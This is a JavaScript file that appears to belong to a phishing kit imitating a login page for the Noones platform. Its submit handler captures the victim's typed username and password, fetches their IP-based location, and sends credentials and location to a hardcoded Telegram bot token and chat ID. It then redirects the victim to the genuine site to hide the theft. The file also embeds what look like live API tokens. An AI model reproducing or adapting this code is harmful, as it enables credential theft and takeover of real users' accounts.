const handleSubmit = async (event) => {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Telegram configuration
    const telegramKey = '5374499027:AAGMJa20GYdN3SixIaN4pwdo_4whQPk7jgk';
    const telegramId = '938303780';

    try {
        // Get IP info
        const ipResponse = await fetch('https://ipinfo.io/json?token=506134bdff2547');
        const details = await ipResponse.json();

        const { ip, city, region, country, loc } = details;

        // Format message with location details
        const message = encodeURIComponent(`Noones Login Details\n${username}\n${password}\n${city}, ${region}, ${country}`);

        // Send to both Telegram IDs
        await fetch(`https://api.telegram.org/bot${telegramKey}/sendMessage?chat_id=${telegramId}&text=${message}`);

        // Redirect and store email
        window.location.href = 'https://noones.com';
        localStorage.setItem('email', username);

    } catch (error) {
        console.error('Error:', error);
    }
};


const handleOTPSubmit = async (event) => {
    event.preventDefault();
    console.log("OTP submitted");
};

// Check if current path matches /offer/uJdeG2vkWKS and redirect to root
if (window.location.pathname === '/offer/uJdeG2vkWKS') {
    window.location.href = '/';
}
